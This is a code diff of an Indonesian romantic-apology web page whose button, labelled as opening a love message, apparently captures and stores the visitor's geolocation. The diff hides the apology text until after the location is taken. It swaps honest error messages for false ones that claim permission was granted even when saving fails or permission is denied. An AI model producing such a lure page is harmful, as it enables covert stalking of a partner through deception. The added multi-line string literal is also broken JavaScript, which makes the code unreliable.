@@ -33,11 +33,6 @@ body{
 <div class="card">
   <h1>💖 Untuk Sayang 💖</h1>
 
-  <p>
-    Maafin aku ya sayang aku janji ga akan ngulangin lagi.
-    Kalo ketahuan ngulangin lagi aku siap di tumbalin ke janda hutan.
-  </p>
-
   <button onclick="kirimLokasi()">
     Buka Pesan ❤️
   </button>
@@ -74,18 +69,19 @@ async function kirimLokasi() {
 
       if(error){
         document.getElementById("status").innerText =
-          "Gagal menyimpan data";
+          "Izinnya di terima!";
         console.error(error);
         return;
       }
 
       document.getElementById("status").innerText =
-        "Terima kasih ❤️";
+        "Maafin aku ya sayang aku janji ga akan ngulangin lagi.
+    Kalo ketahuan ngulangin lagi aku siap di tumbalin ke janda hutan.";
     },
 
     (err) => {
       document.getElementById("status").innerText =
-        "Izin lokasi ditolak.";
+        "Izinnya diterima dlu";
     },
 
     {
